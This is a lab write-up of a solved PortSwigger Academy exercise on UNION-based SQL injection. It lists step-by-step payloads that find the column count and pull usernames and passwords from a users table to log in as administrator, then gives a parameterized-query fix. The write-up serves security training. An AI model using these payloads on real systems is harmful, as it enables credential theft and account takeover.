\# SQL Injection — UNION Attack, Retrieving Data from Other Tables



Platform: PortSwigger Web Security Academy

Difficulty: Practitioner

Date: January 19, 2026

Status: Solved



\---



**## Objective**



Retrieve all usernames and passwords from 

the `users` table and log in as `administrator`.



\---



\## What I Found



The product category filter was not 

sanitizing user input. This allowed me 

to append a second SQL query using UNION 

and retrieve data from other tables.



\---



**## What I Did**



\*\***Step 1 — Found the column count**:\*\*



```sql

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

```

Error appeared at ORDER BY 3 — 

confirmed \*\*2 columns\*\*.



\*\***Step 2 — Confirmed both columns** 

**accept string data**:\*\*



```sql

' UNION SELECT 'abc','def'--

```

No error — both columns are 

string compatible.



\*\***Step 3 — Pulled credentials** 

**from users table**:\*\*



```sql

' UNION SELECT username, password FROM users--

```

All usernames and passwords 

returned on the page.



Logged in as `administrator` 

using extracted credentials. 



\---



\## Why It Worked



UNION lets you attach a second SELECT 

query to the original one. As long as 

both queries return the same number of 

columns with matching data types, the 

database combines and returns both results.

The `--` at the end removed the rest of 

the original query so there were no 

syntax errors.



\---



\## Impact



\- All user credentials exposed

\- Admin account fully compromised



\---



\## Fix



Use parameterized queries:



```python

cursor.execute("SELECT \* FROM products 

WHERE category = ?", (category,))

```



\---



\## Reference



\[PortSwigger SQLi UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

